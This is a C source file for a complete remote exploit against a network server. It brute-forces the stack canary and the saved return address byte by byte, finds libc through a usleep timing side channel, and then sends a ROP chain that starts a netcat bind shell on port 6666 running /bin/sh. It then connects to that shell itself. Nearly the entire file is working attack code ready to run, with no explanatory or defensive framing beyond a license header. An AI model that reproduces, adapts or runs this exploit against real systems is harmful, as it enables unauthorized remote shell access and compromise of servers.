/*
* exploit (server)
*
* Copyright 2012-2013 Benjamin Randazzo <benjamin@linuxcrashing.org>
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <http://www.gnu.org/licenses/>.
*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netdb.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<time.h>
#include<stdint.h>

#define BUF_SIZE 512
#define DUMMY 0x41
#define FIRST_READ(sockfd, buf) \
    read(sockfd, buf, 15);      \
    read(sockfd, buf, 13);

#define FATAL(...) \
    fprintf(stderr,__VA_ARGS__); \
    exit(1);

#define MSG_SIZE 15


/*
* 0x00000f40 <+579>:  call 0xc86 <check_code>
* 0x00000f45 <+584>:  test %eax,%eax
*
* saved EIP is equal to something like 0x00000e68 (after check_code epilogue)
* with PIE enabled, the .text section base address is randomized (0xfffff000)
*/
#define SAVED_EIP_OFFSET 0x00000f45


// 000d1690 T usleep
#define USLEEP_OFFSET 0x000e7b80
// .data addr in libc
#define STACK 0x0015e9a0 // .data addr
// ROP gadgets
#define INT80 0x0002aca5      // int $0x80
#define MOVINSTACK 0x0002a19f // mov %ecx,(%eax) ; ret
#define INCEAX  0x00008e48 // inc
#define POPEAX  0x000143d4 // pop
#define POPECX  0x000f1c9d // pop
#define POPALL  0x000e4e41 // pop
#define XOREAX  0x0003cb7e // xor
// some useful strings (in little-endian)
#define BIN 0x6e69622f // "/bin"
#define NC  0x636e2f2f // "//nc"
#define LNP 0x706e6c2d // "-lnp"
#define LPORT 0x36363636 // "6666"
#define TTE 0x6574742d // "-tte"
#define SH  0x68732f2f // "//sh"

#define REMOTE_PORT 6666
int create_connection(struct sockaddr_in);
int get_cookie_position(struct sockaddr_in, char *);
int bruteforce_cookie(struct sockaddr_in, char *, int, uint32_t *);
int get_saved_eip_position(struct sockaddr_in, char *, int, uint32_t);
int bruteforce_saved_eip(struct sockaddr_in, char *, int, uint32_t, int, uint32_t *);
int bruteforce_usleep(struct sockaddr_in, char *, int, uint32_t, int, uint32_t, uint32_t *);
int exploit(struct sockaddr_in, char *, int, uint32_t, int, uint32_t, uint32_t);

int main(int argc, char **argv) {
    int cookie_pos, saved_eip_pos;
    uint32_t cookie = 0, saved_eip = 0, usleep = 0;
    char buf[BUF_SIZE];
    struct hostent *he;
    struct sockaddr_in addr;
    if (argc < 3) {
        printf("usage: %s target_ip port\n", argv[0]);
        exit(1);
    }
    if ((he = gethostbyname(argv[1])) == NULL) {
        herror("gethostbyname");
        exit(h_errno);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    addr.sin_addr = *((struct in_addr *)he->h_addr);
    memset(&(addr.sin_zero), 0, 8);

    printf("exploit by benjamin\n\n");

    if ((cookie_pos = get_cookie_position(addr, buf)) < 0) {
        FATAL("\tcookie position not found\n");
    }
    printf("%d bytes to reach the cookie\n", cookie_pos);

    printf("bruteforcing the cookie...\n");
    if (bruteforce_cookie(addr, buf, cookie_pos, &cookie) < 0) {
        FATAL("\tcookie not found\n");
    }
    printf("\n\tcookie is 0x%.8x\n\n", cookie);

    if ((saved_eip_pos = get_saved_eip_position(addr, buf, cookie_pos, cookie)) < 0) {
        FATAL("\tsaved eip not found\n");
    }
    printf("%d bytes to reach saved eip\n", saved_eip_pos);

    printf("bruteforcing saved eip...\n");
    if (bruteforce_saved_eip(addr, buf, cookie_pos, cookie, saved_eip_pos, &saved_eip) < 0) {
        FATAL("\tsaved eip not found\n");
    }
    printf("\n\tsaved eip: 0x%.8x\n", saved_eip);

    printf("\ttext base: 0x%.8x\n\n", saved_eip & 0xfffff000);
    printf("bruteforcing the libc...\n");
    if (bruteforce_usleep(addr, buf, cookie_pos, cookie, saved_eip_pos, saved_eip, &usleep) < 0) {
        FATAL("\tusleep() not found\n");
    }
    printf("\n\tusleep at: 0x%.8x\n", usleep);
    printf("\tlibc base: 0x%.8x\n\n", usleep-USLEEP_OFFSET);
    return exploit(addr, buf, cookie_pos, cookie, saved_eip_pos, saved_eip, usleep);
}

int create_connection(struct sockaddr_in addr) {
    int sockfd;
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(errno);
    }
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
        perror("connect");
        exit(errno);
    }
    return sockfd;
}

int get_cookie_position(struct sockaddr_in addr, char *buf) {
    int sockfd, cookie_pos = 1, i, rc;
    for (i=0 ; cookie_pos <= BUF_SIZE ; i++) {
        sockfd = create_connection(addr);
        FIRST_READ(sockfd, buf);
        memset(buf, DUMMY, cookie_pos);
        write(sockfd, buf, cookie_pos);
        rc = read(sockfd, buf, MSG_SIZE);
        close(sockfd);
        if (rc < MSG_SIZE) return cookie_pos - 1;
        cookie_pos++;
    }
    return -1;
}

int bruteforce_cookie(struct sockaddr_in addr, char *buf, int cookie_pos, uint32_t *cookie) {
    int sockfd, rc;
    uint8_t *ptr = (uint8_t *)cookie;
    while (ptr < (uint8_t *)cookie + sizeof(uint32_t)) {
        sockfd = create_connection(addr);
        FIRST_READ(sockfd, buf);
        memset(buf, DUMMY, cookie_pos);
        memcpy(buf + cookie_pos, cookie, sizeof(uint32_t));
        write(sockfd, buf, cookie_pos + (ptr - (uint8_t *)cookie) + 1);
        rc = read(sockfd, buf, MSG_SIZE);
        close(sockfd);
        if (rc < MSG_SIZE) {
            if (*ptr == 0xff) return -1;
            (*ptr)++;
        } else {
            printf("\tbyte found! 0x%02x\n", *ptr);
            ptr++;
        }
    }

    return 0;
}

int get_saved_eip_position(struct sockaddr_in addr, char *buf, int cookie_pos, uint32_t cookie) {
    int sockfd, saved_eip_pos = 1, i, rc;
    for (i = 0 ; saved_eip_pos <= BUF_SIZE ; i++) {
        sockfd = create_connection(addr);
        FIRST_READ(sockfd, buf);
        memset(buf, DUMMY, cookie_pos);
        memcpy(buf + cookie_pos, &cookie, sizeof(uint32_t));
        memset(buf + cookie_pos + sizeof(uint32_t), DUMMY, saved_eip_pos);
        write(sockfd, buf, cookie_pos + sizeof(uint32_t) + saved_eip_pos);
        rc = read(sockfd, buf, MSG_SIZE);
        close(sockfd);
        if (rc < MSG_SIZE) return saved_eip_pos-1;
        saved_eip_pos++;
    }
    return -1;
}

int bruteforce_saved_eip(struct sockaddr_in addr, char *buf, int cookie_pos, uint32_t cookie, int saved_eip_pos, uint32_t *saved_eip) {
    int sockfd, rc;
    uint8_t *ptr = (uint8_t *)saved_eip;
    while (ptr < (uint8_t *)saved_eip + sizeof(uint32_t)) {
        sockfd = create_connection(addr);
        FIRST_READ(sockfd, buf);
        memset(buf, DUMMY, cookie_pos);
        memcpy(buf + cookie_pos, &cookie, sizeof(uint32_t));
        memcpy(buf + cookie_pos + sizeof(uint32_t) + saved_eip_pos, saved_eip, sizeof(uint32_t));
        write(sockfd, buf, cookie_pos+sizeof(uint32_t) + saved_eip_pos + (ptr - (uint8_t *)saved_eip) + 1);
        rc = read(sockfd, buf, MSG_SIZE);
        close(sockfd);
        if (rc < MSG_SIZE) {
            if (*ptr == 0xff) return -1;
            (*ptr)++;
        } else {
            printf("\tbyte found! 0x%02x\n", *ptr);
            ptr++;
        }
    }
    return 0;
}

int bruteforce_usleep(struct sockaddr_in addr, char *buf, int cookie_pos, uint32_t cookie, int saved_eip_pos, uint32_t saved_eip, uint32_t *usleep) {
    int sockfd, i;
    const int sec = 2, usec = sec*1000000;
    uint8_t *ptr = (uint8_t *)usleep;
    struct timeval t1, t2;
    const struct timeval timeout = {sec, 0};
    *usleep = 0;
    *(ptr + 3) = *((uint8_t *)(&saved_eip) + 3);

    for (i=0; i<4096; i++) {
        sockfd = create_connection(addr);
        if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
            perror("setsockopt");
            exit(errno);
        }
        FIRST_READ(sockfd, buf);

        memset(buf, DUMMY, cookie_pos);
        memcpy(buf + cookie_pos, &cookie, sizeof(uint32_t));
        memcpy(buf + cookie_pos + sizeof(uint32_t)   + saved_eip_pos, usleep, sizeof(uint32_t));
        memcpy(buf + cookie_pos + sizeof(uint32_t)*2 + saved_eip_pos, &saved_eip, sizeof(uint32_t));
        memcpy(buf + cookie_pos + sizeof(uint32_t)*3 + saved_eip_pos, &usec, sizeof(uint32_t));
        write(sockfd, buf, cookie_pos + saved_eip_pos + sizeof(uint32_t)*4);

        gettimeofday(&t1, NULL);
        read(sockfd, buf, MSG_SIZE);
        close(sockfd);
        gettimeofday(&t2, NULL);
        t2.tv_sec -= t1.tv_sec;
        if (t2.tv_sec == sec) {
            return 0;
        } else {
            if ((*ptr & 0xf0) == 0xf0) {
                *ptr &= 0x0f;
                (*(ptr+1))++;
            }
            (*ptr)+=0x10;
        }
    }

    return -1;
}

int exploit(struct sockaddr_in addr, char *buf, int cookie_pos, uint32_t cookie, int saved_eip_pos, uint32_t saved_eip, uint32_t usleep) {
    int sockfd;
    char cmd[24];
    const int LIBC = usleep-USLEEP_OFFSET,
          ropchain[] = {POPEAX+LIBC,
              STACK+LIBC,
              POPECX+LIBC,
              BIN,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+4,
              POPECX+LIBC,
              NC,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+9,
              POPECX+LIBC,
              LNP,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+14,
              POPECX+LIBC,
              LPORT,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+19,
              POPECX+LIBC,
              TTE,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+24,
              POPECX+LIBC,
              BIN,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+28,
              POPECX+LIBC,
              SH,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+50,
              POPECX+LIBC,
              STACK+LIBC,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+54,
              POPECX+LIBC,
              STACK+LIBC+9,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+58,
              POPECX+LIBC,
              STACK+LIBC+14,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+62,
              POPECX+LIBC,
              STACK+LIBC+19,
              MOVINSTACK+LIBC,
              POPEAX+LIBC,
              STACK+LIBC+66,
              POPECX+LIBC,
              STACK+LIBC+24,
              MOVINSTACK+LIBC,
              XOREAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              INCEAX+LIBC,
              POPALL+LIBC,
              STACK+LIBC+40,
              STACK+LIBC+50,
              STACK+LIBC,
              INT80+LIBC};
    sockfd = create_connection(addr);
    FIRST_READ(sockfd, buf);
    memset(buf, DUMMY, cookie_pos);
    memcpy(buf+cookie_pos, &cookie, sizeof(uint32_t));
    memcpy(buf+cookie_pos+sizeof(uint32_t)+saved_eip_pos, ropchain,
            sizeof(ropchain));
    printf("send payload (%zu bytes)\n", cookie_pos+sizeof(uint32_t)
            +saved_eip_pos+sizeof(ropchain));
    write(sockfd, buf, cookie_pos+sizeof(uint32_t)+saved_eip_pos
            +sizeof(ropchain));
    close(sockfd);
    sprintf(cmd, "nc %s %d", inet_ntoa(addr.sin_addr), REMOTE_PORT);
    sleep(1);
    printf("\ngot remote shell !\n\n");
    // save the return status just in case
    int status = system(cmd);

    return status;
}

